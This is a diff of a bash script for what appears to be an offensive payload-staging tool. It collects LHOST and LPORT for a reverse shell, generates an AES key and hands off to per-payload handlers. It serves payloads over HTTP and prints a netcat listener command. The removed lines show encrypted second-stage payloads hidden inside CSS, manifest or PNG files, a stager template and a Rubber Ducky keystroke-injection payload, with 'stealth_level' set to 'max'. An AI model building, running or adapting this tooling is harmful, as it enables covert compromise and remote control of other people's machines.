@@ -1,6 +1,9 @@
 #!/bin/bash
 set -euo pipefail
 
+# ==============================
+#        ASCII BANNER
+# ==============================
 cat <<'BANNER'
    ____  _           _       _     ____
   |  _ \| |__   ___ | |_ ___| |__ |  _ \  ___  ___ ___  _ __ ___  ___  _ __
@@ -9,6 +12,9 @@ cat <<'BANNER'
   |_|   |_| |_|\___/ \__\___|_| |_|____/ \___|\___\___/|_|  \___|\___/|_| |_|
 BANNER
 
+# ==============================
+#        UTILITY FUNCTIONS
+# ==============================
 log()   { echo -e "\e[1;32m[$(date +%H:%M:%S)] $1\e[0m"; }
 error() { echo -e "\e[1;31m[$(date +%H:%M:%S)] $1\e[0m" >&2; }
 
@@ -17,10 +23,13 @@ check_dep() {
     command -v "$cmd" &>/dev/null || { error "Missing dependency: $cmd"; exit 1; }
   done
 }
-check_dep python3 lsof nc
+check_dep python3 lsof nc openssl
 
 trap 'cleanup; log "Interrupted. Exiting."; exit 1' INT
 
+# ==============================
+#        ENVIRONMENT SETUP
+# ==============================
 PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 cd "$PROJECT_DIR"
 
@@ -32,26 +41,24 @@ STAGERS_DIR="stagers"
 
 mkdir -p "$OUTPUT_DIR" "$WEB_DIR" "$PAYLOADS_DIR" "$STAGERS_DIR/config"
 
-log "Available local IPv4 addresses:"
+# ==============================
+#   SELECT WEB SERVER INTERFACE
+# ==============================
+log "Available local IPv4 addresses (for web server):"
 mapfile -t ip_list < <(hostname -I | tr ' ' '\n' | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$')
-for i in "${!ip_list[@]}"; do
-  echo "  [$i] ${ip_list[$i]}"
-done
+for i in "${!ip_list[@]}"; do echo "  [$i] ${ip_list[$i]}"; done
 
 while true; do
-  read -p "[*] Choose IP [index]: " ip_index
+  read -p "[*] Choose WEB IP [index]: " ip_index
   if [[ "$ip_index" =~ ^[0-9]+$ ]] && (( ip_index >= 0 && ip_index < ${#ip_list[@]} )); then
-    IP="${ip_list[$ip_index]}"
+    WEB_IP="${ip_list[$ip_index]}"
     break
   else
     echo "Invalid index."
   fi
 done
 
-read -p "[*] Enter PORT for reverse shell (default 8000): " PORT_SHELL
-PORT_SHELL="${PORT_SHELL:-8000}"
-
-read -p "[*] Enter PORT for web server (default 8080): " PORT_SERVE
+read -p "[*] Enter WEB server port (default 8080): " PORT_SERVE
 PORT_SERVE="${PORT_SERVE:-8080}"
 
 free_port() {
@@ -64,10 +71,11 @@ free_port() {
     sleep 1
   fi
 }
-
-free_port "$PORT_SHELL"
 free_port "$PORT_SERVE"
 
+# ==============================
+#       PAYLOAD SELECTION
+# ==============================
 log "Choose target OS:"
 select OS in linux windows mac; do [[ -n "$OS" ]]; break; done
 
@@ -81,102 +89,65 @@ select PAYLOAD in "${PAYLOADS[@]}"; do [[ -n "$PAYLOAD" ]]; break; done
 log "Choose delivery method:"
 select DELIVERY in css manifest png; do [[ -n "$DELIVERY" ]]; break; done
 
-case "$OS" in
-  linux)
-    STAGE2_RAW="$PAYLOADS_DIR/$OS/$PAYLOAD/raw.sh"
-    STAGER_FILE="$PAYLOADS_DIR/$OS/$PAYLOAD/template.sh"
-    FINAL_STAGE1="$OUTPUT_DIR/stage1.sh"
-    FINAL_STAGE1_WEB="stage1.sh";;
-  windows)
-    STAGE2_RAW="$PAYLOADS_DIR/$OS/$PAYLOAD/raw.ps1"
-    STAGER_FILE="$PAYLOADS_DIR/$OS/$PAYLOAD/template.ps1"
-    FINAL_STAGE1="$OUTPUT_DIR/favicon.dat"
-    FINAL_STAGE1_WEB="favicon.dat";;
-  mac)
-    error "Mac not supported." && exit 2;;
-esac
+# ==============================
+#       LHOST & LPORT INPUT
+# ==============================
+read -p "[*] Enter LHOST (for reverse shell): " LHOST
+read -p "[*] Enter LPORT (for reverse shell, default 8000): " LPORT
+LPORT="${LPORT:-8000}"
+free_port "$LPORT"
 
-[[ -f "$STAGE2_RAW" ]] || { error "Missing raw payload $STAGE2_RAW"; exit 1; }
-[[ -f "$STAGER_FILE" ]] || { error "Missing stager template $STAGER_FILE"; exit 1; }
+# ==============================
+#       Generate AES key
+# ==============================
+KEY=$(openssl rand -hex 32)
+KEY_ESCAPED=$(echo "$KEY" | sed -e 's/[\\/&]/\\\\&/g')
 
-TMP_PAYLOAD="$OUTPUT_DIR/tmp_raw_payload"
-cp "$STAGE2_RAW" "$TMP_PAYLOAD"
-sed -i "s/REPLACE_IP/$IP/g; s/REPLACE_PORT/$PORT_SHELL/g" "$TMP_PAYLOAD"
+# ==============================
+#       CUSTOM HANDLER CALL
+# ==============================
+CUSTOM_HANDLER="$PAYLOADS_DIR/$OS/$PAYLOAD/handler.sh"
+if [[ -f "$CUSTOM_HANDLER" ]]; then
+  log "Found custom handler for payload '$PAYLOAD'. Executing..."
 
-log "Encrypting payload..."
-ENCODED=$(python3 tools/encrypt_aes.py "$TMP_PAYLOAD") || { error "Encryption failed"; rm -f "$TMP_PAYLOAD"; exit 1; }
-echo "$ENCODED" > "$OUTPUT_DIR/encrypted_stage2.txt"
-rm -f "$TMP_PAYLOAD"
+  source "$CUSTOM_HANDLER"
 
-case "$DELIVERY" in
-  css)      python3 tools/embed_in_css.py "$OUTPUT_DIR/encrypted_stage2.txt" "$WEB_DIR/style.css" ; DELIVERY_FILE="style.css";;
-  manifest) python3 tools/embed_in_manifest.py "$OUTPUT_DIR/encrypted_stage2.txt" "$WEB_DIR/manifest.json" ; DELIVERY_FILE="manifest.json";;
-  png)      python3 tools/embed_in_png.py "$OUTPUT_DIR/encrypted_stage2.txt" "$WEB_DIR/favicon.png" "$WEB_DIR/favicon.png" ; DELIVERY_FILE="favicon.png";;
-esac
-
-DELIVERY_URL="http://$IP:$PORT_SERVE/$DELIVERY_FILE"
-KEY=$(grep ENCRYPTION_KEY .env | cut -d= -f2 | tr -d '\r\n')
-KEY_HEX=$(echo -n "$KEY" | xxd -p | tr -d '\n')
-KEY_HEX_ESCAPED=$(echo "$KEY_HEX" | sed -e 's/[\/&]/\\&/g')
-
-STAGER_CONTENT=$(sed \
-  -e "s|REPLACE_DELIVERY|$DELIVERY|g" \
-  -e "s|REPLACE_URL|$DELIVERY_URL|g" \
-  -e "s|REPLACE_KEY|$KEY_HEX_ESCAPED|g" \
-  -e "s|REPLACE_AES|$ENCODED|g" \
-  -e "s|REPLACE_IP|$IP|g" \
-  -e "s|REPLACE_PORT|$PORT_SHELL|g" \
-  "$STAGER_FILE")
-
-if echo "$STAGER_CONTENT" | grep -q 'REPLACE_'; then
-  error "Unreplaced placeholders detected in stager template. Abort."
+  if declare -f custom_payload_handler &>/dev/null; then
+    custom_payload_handler "$LHOST" "$LPORT" "$WEB_IP" "$PORT_SERVE" "$DELIVERY" "$PROJECT_DIR" "$OUTPUT_DIR" "$WEB_DIR" "$KEY"
+  else
+    error "Function 'custom_payload_handler' not defined in handler.sh"
+    exit 1
+  fi
+else
+  error "No handler.sh found for payload '$PAYLOAD' under $PAYLOAD_PATH/$PAYLOAD/"
   exit 1
 fi
 
-echo "$STAGER_CONTENT" > "$FINAL_STAGE1"
-cp "$FINAL_STAGE1" "$WEB_DIR/$FINAL_STAGE1_WEB"
-
-log "Generating Ducky payload..."
-python3 tools/generate_ducky.py "$IP" "$PORT_SERVE" 1000 "$OUTPUT_DIR/ducky_payload.txt" "$OS"
-
+# ==============================
+#     START HTTP SERVER
+# ==============================
 serve_web() {
   cd "$WEB_DIR"
-  log "Serving at http://$IP:$PORT_SERVE"
+  log "Serving at http://$WEB_IP:$PORT_SERVE"
   python3 -m http.server "$PORT_SERVE" --bind 0.0.0.0 > ../output/http_server.log 2>&1 &
   SERVER_PID=$!
   cd "$PROJECT_DIR"
 }
-
 serve_web
 sleep 1
 
+# ==============================
+#     FINAL LOG OUTPUT
+# ==============================
 log "Payload generation complete."
-echo "  Stage 1 URL:     http://$IP:$PORT_SERVE/$FINAL_STAGE1_WEB"
-echo "  Delivery file:   http://$IP:$PORT_SERVE/$DELIVERY_FILE"
-echo "  Netcat listener: nc -lvnp $PORT_SHELL"
+echo "  Web delivery root: http://$WEB_IP:$PORT_SERVE/"
+echo "  Netcat listener:   nc -lvnp $LPORT"
 
-echo "[$(date)] $IP $PORT_SHELL $PORT_SERVE $OS $PAYLOAD $DELIVERY" >> build_history.log
+echo "[$(date)] $WEB_IP $LPORT $PORT_SERVE $OS $PAYLOAD $DELIVERY KEY=$KEY" >> build_history.log
 
-cat > "$CONFIG_FILE" <<EOF
-{
-  "last_used": {
-    "ip": "$IP",
-    "port_shell": $PORT_SHELL,
-    "port_serve": $PORT_SERVE,
-    "os": "$OS",
-    "payload": "$PAYLOAD",
-    "delivery": "$DELIVERY",
-    "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
-  },
-  "options": {
-    "stealth_level": "max",
-    "auto_cleanup": true,
-    "log_enabled": true,
-    "default_encryption": "aes-256-cbc"
-  }
-}
-EOF
-
+# ==============================
+#       CLEANUP HANDLER
+# ==============================
 cleanup() {
   if [[ -n "${SERVER_PID:-}" ]] && ps -p $SERVER_PID &>/dev/null; then
     log "Stopping HTTP server (PID $SERVER_PID)..."
